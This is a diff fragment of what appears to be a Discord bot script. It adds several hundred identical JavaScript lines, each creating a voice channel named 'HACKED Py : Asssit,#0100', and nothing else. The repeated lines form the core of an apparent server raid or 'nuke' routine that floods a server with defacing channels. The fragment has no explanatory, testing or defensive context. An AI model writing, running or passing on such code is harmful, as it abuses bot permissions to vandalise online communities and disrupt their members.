+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
